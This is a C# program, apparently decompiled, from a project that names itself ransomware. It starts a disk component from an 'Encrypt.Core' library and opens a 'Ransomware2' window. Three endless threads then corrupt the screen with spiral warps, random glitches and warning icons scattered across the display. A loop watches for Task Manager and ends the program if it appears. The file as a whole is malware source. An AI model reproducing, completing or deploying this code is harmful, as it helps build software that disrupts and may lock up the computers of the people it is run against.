using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Encrypt.Core;

namespace Rasomware2._0;

internal class Program
{
	private struct POINT
	{
		public int x;

		public int y;
	}

	private static int width = GetSystemMetrics(0);

	private static int height = GetSystemMetrics(1);

	private static readonly HDD _HDD = new HDD();

	[DllImport("gdi32")]
	private static extern IntPtr CreateDC(string lpszDriver, string lpszDevice, string lpszOutput, string lpInitData);

	[DllImport("user32")]
	private static extern int GetSystemMetrics(int smIndex);

	[DllImport("gdi32.dll")]
	private static extern bool StretchBlt(IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest, IntPtr hdcSrc, int xSrc, int ySrc, int wSrc, int hSrc, int rop);

	[DllImport("user32.dll")]
	private static extern IntPtr LoadIcon(IntPtr hInstance, int lpIconName);

	[DllImport("user32.dll")]
	private static extern bool DrawIcon(IntPtr hdc, int xLeft, int yTop, IntPtr hIcon);

	[DllImport("gdi32.dll")]
	private static extern bool PlgBlt(IntPtr hdcDest, POINT[] lpPoint, IntPtr hdcSrc, int nXSrc, int nYSrc, int nWidth, int nHeight, IntPtr hbmMask, int xMask, int yMask);

	[DllImport("user32")]
	private static extern bool GetCursorPos(out POINT lpPoint);

	private static void spiral()
	{
		while (true)
		{
			for (int i = 0; i < 100; i++)
			{
				IntPtr intPtr = CreateDC("DISPLAY", null, null, null);
				POINT pOINT = default(POINT);
				pOINT.x = 0;
				pOINT.y = height - i;
				POINT pOINT2 = pOINT;
				pOINT = default(POINT);
				pOINT.x = i;
				pOINT.y = 0;
				POINT pOINT3 = pOINT;
				pOINT = default(POINT);
				pOINT.x = width - i;
				pOINT.y = height;
				POINT pOINT4 = pOINT;
				PlgBlt(intPtr, new POINT[3] { pOINT2, pOINT3, pOINT4 }, intPtr, 0, 0, width, height, IntPtr.Zero, 0, 0);
			}
		}
	}

	private static void Warning()
	{
		while (true)
		{
			Random random = new Random();
			IntPtr hdc = CreateDC("DISPLAY", null, null, null);
			IntPtr hIcon = LoadIcon(IntPtr.Zero, random.Next(32512, 32518));
			DrawIcon(hdc, random.Next(0, width), random.Next(0, height), hIcon);
		}
	}

	private static void Glitch()
	{
		while (true)
		{
			IntPtr intPtr = CreateDC("DISPLAY", null, null, null);
			Random random = new Random();
			int xDest = random.Next(0, width);
			int yDest = random.Next(0, height);
			int xSrc = random.Next(0, width);
			int ySrc = random.Next(0, height);
			int wDest = random.Next(0, width);
			int hDest = random.Next(0, height);
			int wSrc = random.Next(0, width);
			int hSrc = random.Next(0, height);
			StretchBlt(intPtr, xDest, yDest, wDest, hDest, intPtr, xSrc, ySrc, wSrc, hSrc, 6684742);
		}
	}

	[STAThread]
	private static void Main()
	{
		_HDD.Start();
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		Application.Run((Form)(object)new Ransomware2());
		Thread.Sleep(2000);
		Thread thread = new Thread(spiral);
		Thread thread2 = new Thread(Glitch);
		Thread thread3 = new Thread(Warning);
		thread.Start();
		thread2.Start();
		thread3.Start();
		while (true)
		{
			Process[] processesByName = Process.GetProcessesByName("taskmgr");
			if (processesByName.Length != 0)
			{
				Process.GetCurrentProcess().Kill();
			}
		}
	}
}
